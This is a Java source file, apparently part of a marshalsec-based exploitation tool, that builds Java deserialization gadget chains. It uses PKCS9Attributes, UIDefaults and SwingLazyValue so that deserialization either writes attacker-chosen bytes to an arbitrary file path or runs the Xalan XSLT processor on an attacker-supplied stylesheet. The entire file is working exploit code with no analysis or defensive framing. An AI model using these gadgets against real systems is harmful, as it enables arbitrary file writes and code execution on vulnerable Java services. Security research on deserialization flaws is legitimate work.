package util;

import me.gv7.woodpecker.marshalsec.util.Reflections;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;

import javax.swing.*;

public class GadgetFactory {
    public static Object createXSLTWriteFileObject(String path, byte[] data){
        try {
            Class swingLazyValueClass = ClassFactory.getSwingLazyValueClass();
            PKCS9Attributes pkcs9Attributes = Reflections.createWithoutConstructor(PKCS9Attributes.class);
            UIDefaults uiDefaults = new UIDefaults();
            uiDefaults.put(
                    PKCS9Attribute.EMAIL_ADDRESS_OID,
                    swingLazyValueClass.getDeclaredConstructor(String.class,String.class,Object[].class)
                            .newInstance("com.sun.org.apache.xml.internal.security.utils.JavaUtils",
                                    "writeBytesToFilename",
                                    new Object[]{path,data}));
            Reflections.setFieldValue(pkcs9Attributes,"attributes",uiDefaults);
            return pkcs9Attributes;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static Object createXSLTSerializeObject(String xsltPath){
        try {
            Class swingLazyValueClass = ClassFactory.getSwingLazyValueClass();
            PKCS9Attributes pkcs9Attributes = Reflections.createWithoutConstructor(PKCS9Attributes.class);
            UIDefaults uiDefaults = new UIDefaults();
            uiDefaults.put(
                    PKCS9Attribute.EMAIL_ADDRESS_OID,
                    swingLazyValueClass.getDeclaredConstructor(String.class,String.class,Object[].class).newInstance(
                            "com.sun.org.apache.xalan.internal.xslt.Process",
                            "_main",
                            new Object[]{new String[]{"-XT", "-XSL", xsltPath}}
                    ));
            Reflections.setFieldValue(pkcs9Attributes,"attributes",uiDefaults);
            return pkcs9Attributes;
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
